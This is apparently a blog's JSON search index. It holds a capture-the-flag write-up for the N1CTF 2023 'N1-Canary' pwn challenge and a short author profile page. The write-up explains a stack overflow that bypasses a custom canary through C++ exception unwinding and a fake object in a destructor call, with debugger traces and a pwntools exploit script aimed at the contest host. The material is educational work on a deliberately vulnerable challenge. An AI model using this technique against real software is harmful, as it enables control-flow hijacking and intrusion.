
{
    
    
    
    
        
        
        
    
        
        
        
    
    "pages": [{"date":"2023-10-24","image":"","imageAlt":"","link":"https://w1n-gl0ry.github.io/posts/n1ctf-2023/","summary":"N1CTF 2023 Writeups N1-Canary","tags":["C++","ctf","pwn"],"text":"introduction rating weight: 97,33\nduring weekends, i played the n1ctf contest with my teammate cauca. we ranked in the top 45 and i solved 1/4 of the problems in the pwn category.\nn1-canary after the contest, i asked the author for the source of the challenge to make it easier to debug. main.cpp\n#include \u0026#34;sys/random.h\u0026#34; #include \u0026#34;utils.h\u0026#34; #include \u0026lt;cstdio\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;memory\u0026gt; constexpr size_t canary_randbits = 3; constexpr size_t canary_shiftbits = 4; constexpr size_t canary_pool_size = 1 \u0026lt;\u0026lt; canary_randbits; u64 user_canary[canary_pool_size]; u64 sys_canary[canary_pool_size]; template \u0026lt;size_t size\u0026gt; struct protectedbuffer { char buf[size]; char padding = 0; u64 canary; protectedbuffer() { bzero(buf, sizeof(buf)); canary = getcanary(); } u64 getcanary() { u64 addr = (u64)this; u64 canary_idx = (addr \u0026gt;\u0026gt; canary_shiftbits) \u0026amp; (canary_pool_size - 1); u64 raw_canary = user_canary[canary_idx] ^ sys_canary[canary_idx]; return raw_canary; } void check() { if (canary != getcanary()) { raise(\u0026#34;*** stack smash detected ***\u0026#34;); } } template \u0026lt;typename fn\u0026gt; void mut(fn const \u0026amp;fn) { fn(buf); check(); } }; static void init_canary() { if (sizeof(sys_canary) != getrandom(sys_canary, sizeof(sys_canary), 0)) { raise(\u0026#34;canary init error\u0026#34;); } puts(\u0026#34;to increase entropy, give me your canary\u0026#34;); readall(user_canary); } struct unsafeapp { unsafeapp() { puts(\u0026#34;creating dangerous app...\u0026#34;); } virtual ~unsafeapp() {} virtual void launch() = 0; }; struct bofapp : unsafeapp { void launch() override { protectedbuffer\u0026lt;64\u0026gt; buf; puts(\u0026#34;input something to pwn :)\u0026#34;); buf.mut([](char *p) { scanf(\u0026#34;%[^\\n]\u0026#34;, p); }); puts(buf.buf); } }; static void backdoor() { system(\u0026#34;/readflag\u0026#34;); } int main() { setbuf(stdin, nullptr); setbuf(stdout, nullptr); init_canary(); try { auto app = std::make_unique\u0026lt;bofapp\u0026gt;(); app-\u0026gt;launch(); } catch (...) { puts(\u0026#34;error!!!\u0026#34;); exit(1); } } utils.h\n#pragma once #include \u0026lt;cstdlib\u0026gt; #include \u0026lt;stdexcept\u0026gt; #include \u0026lt;unistd.h\u0026gt; using u64 = unsigned long long; static inline void raise(const char *msg) { puts(msg); throw std::runtime_error(msg); } static inline void readall(void *ptr, size_t size) { char *p = (char *)ptr; size_t tot = 0; while (tot \u0026lt; size) { auto res = read(stdin_fileno, p + tot, size - tot); if (res \u0026lt;= 0) raise(\u0026#34;io error\u0026#34;); tot += res; } } template \u0026lt;typename t\u0026gt; static inline void readall(t \u0026amp;dest) { readall(\u0026amp;dest, sizeof(dest)); } the author of the challenge has implemented a custom canary, as the title suggests.\nstatic void init_canary() { if (sizeof(sys_canary) != getrandom(sys_canary, sizeof(sys_canary), 0)) { raise(\u0026#34;canary init error\u0026#34;); } puts(\u0026#34;to increase entropy, give me your canary\u0026#34;); readall(user_canary); } in main function, an object was actually instantiated and other subsequent functions were called.\nint __fastcall main(int argc, const char **argv, const char **envp) { __int64 v3; // rax char v5[8]; // [rsp+0h] [rbp-20h] byref unsigned __int64 v6; // [rsp+8h] [rbp-18h] v6 = __readfsqword(0x28u); setbuf(stdin, 0ll); setbuf(_bss_start, 0ll); init_canary(); std::make_unique\u0026lt;bofapp\u0026gt;(v5); v3 = std::unique_ptr\u0026lt;bofapp\u0026gt;::operator-\u0026gt;(v5); (*(void (__fastcall **)(__int64))(*(_qword *)v3 + 16ll))(v3); std::unique_ptr\u0026lt;bofapp\u0026gt;::~unique_ptr(v5); return 0; } i have located the destructor for this object, which will invoke the function pointer.\n__int64 __fastcall std::default_delete\u0026lt;bofapp\u0026gt;::operator()(__int64 a1, __int64 a2) { __int64 result; // rax result = a2; if ( a2 ) return (*(__int64 (__fastcall **)(__int64))(*(_qword *)a2 + 8ll))(a2); return result; } the main function will invoke the bofapp::launch function.\nunsigned __int64 __fastcall bofapp::launch(bofapp *this) { char v2; // [rsp+1fh] [rbp-61h] byref char s[88]; // [rsp+20h] [rbp-60h] byref unsigned __int64 v4; // [rsp+78h] [rbp-8h] v4 = __readfsqword(0x28u); protectedbuffer\u0026lt;64ul\u0026gt;::protectedbuffer(s); puts(\u0026#34;input something to pwn :)\u0026#34;); protectedbuffer\u0026lt;64ul\u0026gt;::mut\u0026lt;bofapp::launch(void)::{lambda(char *)#1}\u0026gt;(s, \u0026amp;v2); puts(s); return v4 - __readfsqword(0x28u); it\u0026rsquo;s look safe, we continue in mut function, it take a function as a argument\n_int64 __fastcall protectedbuffer\u0026lt;64ul\u0026gt;::mut\u0026lt;bofapp::launch(void)::{lambda(char *)#1}\u0026gt;(__int64 a1, __int64 a2) { bofapp::launch(void)::{lambda(char *)#1}::operator()(a2, a1); return protectedbuffer\u0026lt;64ul\u0026gt;::check(a1); } vulnerability through debugging, we can see that there is a stack overflow vulnerability in the function that was called because it calls to scanf(\u0026quot;%[^\\n]\u0026quot;, p) and doesn\u0026rsquo;t check the boundary\nbut it isn\u0026rsquo;t easy to use a normal bof attack, because it calls the function protectedbuffer\u0026lt;64ul\u0026gt;:: check(a1).\nbool __fastcall protectedbuffer\u0026lt;64ul\u0026gt;::check(__int64 a1) { __int64 v1; // rbx bool result; // al v1 = *(_qword *)(a1 + 72); result = v1 != protectedbuffer\u0026lt;64ul\u0026gt;::getcanary(a1); if ( result ) raise(\u0026#34;*** stack smash detected ***\u0026#34;); return result; } if we cannot bypass this, it will trigger a stack smash error. we\u0026rsquo;ll address it later.\nint backdoor(void) { return system(\u0026#34;/readflag\u0026#34;); } i see a backdoor function. how can we call it without bypassing the canary?\nc++ exception handling try { auto app = std::make_unique\u0026lt;bofapp\u0026gt;(); app-\u0026gt;launch(); } catch (...) { puts(\u0026#34;error!!!\u0026#34;); exit(1); } when the check fails, the program will print *** stack smash detected *** using the raise() function. in this case, the program will look for a catch statement to handle the exception and prevent the program from crashing.\n──────────────────────────────────────────────────────────────────────────[ disasm / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────── 0x4018f2 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+40\u0026gt; setne al 0x4018f5 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+43\u0026gt; test al, al 0x4018f7 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+45\u0026gt; je protectedbuffer\u0026lt;64ul\u0026gt;::check()+62 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+62\u0026gt; 0x4018f9 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+47\u0026gt; lea rax, [rip + 0x7be] 0x401900 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+54\u0026gt; mov rdi, rax ► 0x401903 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+57\u0026gt; call raise(char const*) \u0026lt;raise(char const*)\u0026gt; rdi: 0x4020be ◂— \u0026#39;*** stack smash detected ***\u0026#39; rsi: 0xa rdx: 0x0 rcx: 0x20 0x401908 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+62\u0026gt; nop 0x401909 \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+63\u0026gt; mov rbx, qword ptr [rbp - 8] 0x40190d \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+67\u0026gt; leave 0x40190e \u0026lt;protectedbuffer\u0026lt;64ul\u0026gt;::check()+68\u0026gt; ret 0x40190f nop ────────────────────────────────────────────────────────────────────────────────────────[ stack ]──────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7ffdf367cad0 ◂— 9 /* \u0026#39;\\t\u0026#39; */ 01:0008│ 0x7ffdf367cad8 —▸ 0x7ffdf367cb40 ◂— \u0026#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#39; 02:0010│ 0x7ffdf367cae0 —▸ 0x7ffdf367cb40 ◂— \u0026#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#39; 03:0018│ 0x7ffdf367cae8 —▸ 0x7ffdf367cce8 —▸ 0x7ffdf367e21e ◂— 0x74756f2e612f2e /* \u0026#39;./a.out\u0026#39; */ 04:0020│ rbp 0x7ffdf367caf0 —▸ 0x7ffdf367cb10 —▸ 0x7ffdf367cba0 ◂— 0x0 05:0028│ 0x7ffdf367caf8 —▸ 0x401739 (void protectedbuffer\u0026lt;64ul\u0026gt;::mut\u0026lt;bofapp::launch()::{lambda(char*)#1}\u0026gt;(bofapp::launch()::{lambda(char*)#1} const\u0026amp;)+51) ◂— nop 06:0030│ 0x7ffdf367cb00 —▸ 0x7ffdf367cb3f ◂— 0x4141414141414100 07:0038│ 0x7ffdf367cb08 —▸ 0x7ffdf367cb40 ◂— \u0026#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#39; ──────────────────────────────────────────────────────────────────────────────────────[ backtrace ]────────────────────────────────────────────────────────────────────────────────────── ► 0 0x401903 protectedbuffer\u0026lt;64ul\u0026gt;::check()+57 1 0x401739 void protectedbuffer\u0026lt;64ul\u0026gt;::mut\u0026lt;bofapp::launch()::{lambda(char*)#1}\u0026gt;(bofapp::launch()::{lambda(char*)#1} const\u0026amp;)+51 2 0x40169d bofapp::launch()+77 3 0x403407 4 0x4f4ab0 5 0x4f4ab0 6 0x12000 7 0x7ffdf367cce8 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; stack unwinding if it is not found in this function, it will be searched up along the function call chain, and there will be two results:\nfind the catch, record the catch location, clean the stack starting from the function that throws the exception, until you reach the function where the catch is located, and enter the catch code for processing if the corresponding catch is not found after walking through the call chain, then call std::terminate(), this function to abort the program by default. if you are curious about that, please feel free to read the article.\nthe next functions called in sequence are: raise-\u0026gt;__cxa_throw-\u0026gt;_unwind_raiseexception.\n► 0x404056 \u0026lt;__cxa_throw+54\u0026gt; call _unwind_raiseexception \u0026lt;_unwind_raiseexception\u0026gt; rdi: 0x12c13b0 ◂— 0x474e5543432b2b00 rsi: 0x4e76f0 (typeinfo for std::runtime_error) —▸ 0x4e75e0 (vtable for __cxxabiv1::__si_class_type_info+16) —▸ 0x404120 (__cxxabiv1::__si_class_type_info::~__si_class_type_info()) ◂— endbr64 rdx: 0x404740 (std::runtime_error::~runtime_error()) ◂— endbr64 rcx: 0x12c1408 ◂— \u0026#39;*** stack smash detected ***\u0026#39; the function _unwind_raiseexception() takes the address of each frame below to locate the corresponding catch. if it fails to find one, the function calls std::terminate() to abort and exit the program.\n──────────────────────────────────────────────────────────────────────────────────────[ backtrace ]────────────────────────────────────────────────────────────────────────────────────── ► 0 0x404056 __cxa_throw+54 1 0x402178 raise(char const*)+83 2 0x4026b2 protectedbuffer\u0026lt;64ul\u0026gt;::check()+62 3 0x4024e3 void protectedbuffer\u0026lt;64ul\u0026gt;::mut\u0026lt;bofapp::launch()::{lambda(char*)#1}\u0026gt;(bofapp::launch()::{lambda(char*)#1} const\u0026amp;)+51 4 0x40245a bofapp::launch()+62 5 0xdeadbeef 6 0xdeadbeef 7 0xdeadbeef ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── so, if we want to continue the flow execution in main, we much provide exactly where the address of the catch block is, so we can continue to exploit it that don\u0026rsquo;t terminate program.\ni have found out the address 0x4022de that make the program continue execution because it is where the catch block lie.\n0x41acdd \u0026lt;_unwind_raiseexception+909\u0026gt; mov r14, qword ptr [rbp - 0x10] 0x41ace1 \u0026lt;_unwind_raiseexception+913\u0026gt; mov r15, qword ptr [rbp - 8] 0x41ace5 \u0026lt;_unwind_raiseexception+917\u0026gt; mov rbp, qword ptr [rbp] 0x41ace9 \u0026lt;_unwind_raiseexception+921\u0026gt; mov rsp, rcx 0x41acec \u0026lt;_unwind_raiseexception+924\u0026gt; pop rcx ► 0x41aced \u0026lt;_unwind_raiseexception+925\u0026gt; jmp rcx \u0026lt;main+116\u0026gt; ↓ 0x4022f1 \u0026lt;main+116\u0026gt; endbr64 0x4022f5 \u0026lt;main+120\u0026gt; mov rbx, rax 0x4022f8 \u0026lt;main+123\u0026gt; lea rax, [rbp - 0x18] 0x4022fc \u0026lt;main+127\u0026gt; mov rdi, rax 0x4022ff \u0026lt;main+130\u0026gt; call std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr() \u0026lt;std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr()\u0026gt; we successfully changed its flow! it will call to exit() to terminate the program without return. how can we execute the backdoor() function?\nafterwards, the program will proceed to execute the destructor method of this particular object. let\u0026rsquo;s delve deeper into this process:\n0x4022f1 \u0026lt;main+116\u0026gt; endbr64 0x4022f5 \u0026lt;main+120\u0026gt; mov rbx, rax 0x4022f8 \u0026lt;main+123\u0026gt; lea rax, [rbp - 0x18] 0x4022fc \u0026lt;main+127\u0026gt; mov rdi, rax ► 0x4022ff \u0026lt;main+130\u0026gt; call std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr() \u0026lt;std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr()\u0026gt; rdi: 0x7ffe1006ece8 —▸ 0x7ffe1006ed40 ◂— \u0026#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#39; rsi: 0x4022f1 (main+116) ◂— endbr64 rdx: 0x1 rcx: 0x4022f1 (main+116) ◂— endbr64 arbitrary execution we go through and see this will cause sigsev when rdx doesn\u0026rsquo;t point to a valid address,\n0x4027d7 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+29\u0026gt; mov rdx, qword ptr [rax] 0x4027da \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+32\u0026gt; add rdx, 8 ► 0x4027de \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+36\u0026gt; mov rdx, qword ptr [rdx] 0x4027e1 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+39\u0026gt; mov rdi, rax 0x4027e4 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+42\u0026gt; call rdx as long as you control the rax register, you can control the rdx register, which results in arbitrary execution.\nthis function takes out the data from the stack combined with the stack overflow above we can control the rax register.\n0x4025c9 \u0026lt;std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr()+57\u0026gt; mov rbx, rax 0x4025cc \u0026lt;std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr()+60\u0026gt; mov rax, qword ptr [rbp - 0x18] 0x4025d0 \u0026lt;std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr()+64\u0026gt; mov rdi, rax ► 0x4025d3 \u0026lt;std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::~unique_ptr()+67\u0026gt; call std::remove_reference\u0026lt;bofapp*\u0026amp;\u0026gt;::type\u0026amp;\u0026amp; std::move\u0026lt;bofapp*\u0026amp;\u0026gt;(bofapp*\u0026amp;) \u0026lt;std::remove_reference\u0026lt;bofapp*\u0026amp;\u0026gt;::type\u0026amp;\u0026amp; std::move\u0026lt;bofapp*\u0026amp;\u0026gt;(bofapp*\u0026amp;)\u0026gt; rdi: 0x4022c6 (main+73) ◂— call 0xffffffffe907ac13 rsi: 0x4022f1 (main+116) ◂— endbr64 rdx: 0x1 rcx: 0x4022f1 (main+116) ◂— endbr64 finally, we manage to control rdx register to point to the backdoor() function.\n0x4027d5 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+27\u0026gt; je std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+44 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+44\u0026gt; 0x4027d7 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+29\u0026gt; mov rdx, qword ptr [rax] 0x4027da \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+32\u0026gt; add rdx, 8 0x4027de \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+36\u0026gt; mov rdx, qword ptr [rdx] 0x4027e1 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+39\u0026gt; mov rdi, rax ► 0x4027e4 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+42\u0026gt; call rdx \u0026lt;backdoor()\u0026gt; rdi: 0x4eb0c0 (user_canary) ◂— 0x4eb0c0 rsi: 0x4eb0c0 (user_canary) ◂— 0x4eb0c0 rdx: 0x402263 (backdoor()) ◂— endbr64 rcx: 0x4022f1 (main+116) ◂— endbr64 0x4027e6 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+44\u0026gt; nop 0x4027e7 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+45\u0026gt; leave 0x4027e8 \u0026lt;std::default_delete\u0026lt;bofapp\u0026gt;::operator()(bofapp*) const+46\u0026gt; ret 0x4027e9 nop 0x4027ea \u0026lt;std::unique_ptr\u0026lt;bofapp, std::default_delete\u0026lt;bofapp\u0026gt; \u0026gt;::get() const\u0026gt; endbr64 [debug] received 0x1c bytes: b\u0026#39;sh: 1: /readflag: not found\\n\u0026#39; sh: 1: /readflag: not found exploit script solve.py\nfrom pwn import * import time if args.local: io=process(\u0026#39;./a.out\u0026#39;) if args.gdb: cmd=\u0026#34;\u0026#34;\u0026#34; b* 0x420978 b* 0x4038fc c \u0026#34;\u0026#34;\u0026#34; gdb.attach(io, gdbscript=cmd) else: io=remote(\u0026#39;43.132.193.22\u0026#39;, 9999) elf=context.binary=elf(\u0026#39;./a.out\u0026#39;) context.log_level=\u0026#39;debug\u0026#39; system=0x000000000042dc10 pop_rdi=0x0000000000403090 bin_sh=0x4bdd62 backdoor=0x000000000403387 user_canary=0x4f4aa0 pl=p64(backdoor)*2+p64(0x4f4aa0) # fake obj pause() io.send(pl+(64-len(pl))*b\u0026#39;\\0\u0026#39;) sleep(1) pl=b\u0026#39;a\u0026#39;*96+p64(0)+p64(0x0000000000403407)+p64(0x4f4aa0+8*2)*2 pause() sleep(1) io.sendline(pl) sleep(1) io.interactive() reference https://maskray.me/blog/2020-11-08-stack-unwinding\nhttps://github.com/chop-project/\nhttps://www.cnblogs.com/catch/p/3604516.html\nhttps://baiy.cn/doc/cpp/inside_exception.htm\n","title":"N1CTF 2023 Writeups"},{"date":"2023-07-31","image":"","imageAlt":"","link":"https://w1n-gl0ry.github.io/about/about/","summary":"","tags":[],"text":"introduction hong konger | 21 y/o | crtp \u0026amp; oscp | ctf player (pwn) | learning red team stuffs\nwriting blog posts to share or record my ctf writeups, experience, and useless research.\ncontact twitter: https://twitter.com/w1ngl0ry\ngithub: https://github.com/w1n-gl0ry\ndiscord: @w1n-gl0ry#8067\nemail: duynguyen45608@gmail.com\n","title":"About me"}]
}

